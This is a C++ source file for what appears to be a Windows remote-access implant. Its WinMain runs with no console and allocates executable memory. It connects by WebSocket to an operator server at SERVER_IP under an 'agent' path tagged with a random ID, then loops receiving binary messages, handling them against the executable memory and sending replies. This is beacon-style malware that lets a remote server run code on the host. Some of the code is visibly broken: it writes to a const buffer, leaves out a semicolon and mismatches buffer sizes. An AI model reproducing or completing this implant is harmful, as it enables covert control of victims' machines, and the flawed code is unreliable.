#include "global.hpp"
#include "connection.hpp"
#include "identifier.hpp"

//#define DEBUG
#ifdef DEBUG
#include <iostream>
using namespace std;
#endif



PVOID getMem(SIZE_T size, DWORD dwProtect);

PVOID scratchpad;

bool handleMessage(
    const char* input,
    size_t inputSize,
    char* output,
    size_t outputCapacity,
    size_t& outputSize,
    PVOID execution_mem
);

#include <windows.h>

int WINAPI WinMain(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR lpCmdLine,
    int nCmdShow
){
    
    (void)hInstance;
    (void)hPrevInstance;
    (void)lpCmdLine;
    (void)nCmdShow;
    PVOID mem = getMem(0x10000, PAGE_EXECUTE_READWRITE);
    scratchpad = getMem(0x100000, PAGE_READWRITE);

    const char host[256] = "ws://";

    strcat(host, SERVER_IP)

    char identifier[37];
    random_uuid(identifier);

    char path[128];
    const char* basePath = "/api/v1/anon/agent/ws/";

    size_t baseLen = strlen(basePath);
    size_t idLen = strlen(identifier);

    if (baseLen + idLen + 1 > sizeof(path) / sizeof(wchar_t)) {
        return 1;
    }
    strcpy(path, host);
    strcat(path, basePath);
    strcat(path, identifier);

    WebSocketClient client = {};

    if (!connectWebSocket(client, path)) {
        return 1;
    }
    size_t MESSAGE_BUFFER_SIZE = 0x10000;
    size_t RESPONSE_BUFFER_SIZE = 0x100000;
    char *messageBuffer = new char[MESSAGE_BUFFER_SIZE];
    char *responseBuffer = new char[RESPONSE_BUFFER_SIZE];
    size_t messageSize = 0;
    size_t responseSize = 0;

    while (true) {
        if (!receiveBinary(
                client,
                messageBuffer,
                MESSAGE_BUFFER_SIZE,
                messageSize)) {
            #ifdef DEBUG
            cout << "Error receiving." << endl;
            #endif
            break;
        }
        #ifdef DEBUG
        cout << "Received" << messageBuffer << endl;
        #endif
        
        if (!handleMessage(
                messageBuffer,
                messageSize,
                responseBuffer,
                RESPONSE_BUFFER_SIZE,
                responseSize,
                mem)) {
                    #ifdef DEBUG
            cout << "Error handling message." << endl;
            #endif
            break;
        }

        if (!sendBinary(client, responseBuffer, responseSize)) {
            #ifdef DEBUG
            cout << "Error sending." << endl;
            #endif
            break;
        }
    }

    return 0;
}